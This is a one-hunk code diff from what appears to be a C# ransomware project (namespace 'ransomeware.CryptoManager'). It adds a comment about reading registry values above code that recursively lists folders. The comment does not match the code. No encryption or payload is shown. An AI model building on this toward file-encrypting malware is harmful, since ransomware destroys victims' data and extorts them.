@@ -37,6 +37,7 @@ namespace ransomeware.CryptoManager
         {
             DirManager dfm = new DirManager();
 
+            // get list of all values in registry
             List<String> dirs = DirManager.GetFoldersRecursive(starting_path);
             foreach (String subDir in dirs)
             {
